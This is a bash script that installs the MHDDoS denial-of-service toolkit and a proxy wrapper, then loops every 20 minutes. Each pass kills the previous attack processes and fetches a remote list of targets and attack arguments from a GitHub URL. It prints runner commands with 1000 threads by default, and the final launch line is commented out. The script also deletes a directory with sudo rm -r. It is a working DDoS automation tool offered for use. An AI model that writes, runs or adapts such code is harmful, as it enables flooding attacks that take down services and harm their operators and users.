#!/bin/bash
# Install git, python3, pip, mhddos_proxy, MHDDoS and updated proxy list.
sudo apt update -y
sudo apt install git python3 python3-pip -y
sudo pip install --upgrade pip
#cd ~
sudo rm -r ~/mhddos_proxy
git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git ~/
#cd mhddos_proxy
sudo wget -N https://raw.githubusercontent.com/Aruiem234/mhddosproxy/main/proxies_config.json -P ~/mhddos_proxy/
sudo git clone https://github.com/MHProDev/MHDDoS.git ~/mhddos_proxy/
sudo python3 -m pip install -r ~/mhddos_proxy/MHDDoS/requirements.txt

threads="${1:-1000}"; threads="-t $threads"

# Restart attacks and update targets every 20 minutes
while true
do
   pkill -f start.py; pkill -f runner.py 
   # Get number of targets.
   list_size=$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets | cat | grep "^[^#]" | wc -l)
   echo -e "\nNumber of targets in list: " $list_size "\n"
   for (( i=1; i<=list_size; i++ ))
      do
            cmd_line=$(awk 'NR=='"$i" <<< "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets  | cat | grep "^[^#]")")
            echo -e $i": " "$cmd_line $threads "--rpc 50" "-p 3600" "--debug"\n"
            #python3 ~/mhddos_proxy/runner.py $cmd_line $threads $proxy_interval $rpc $debug&
      done
sleep 20m
done
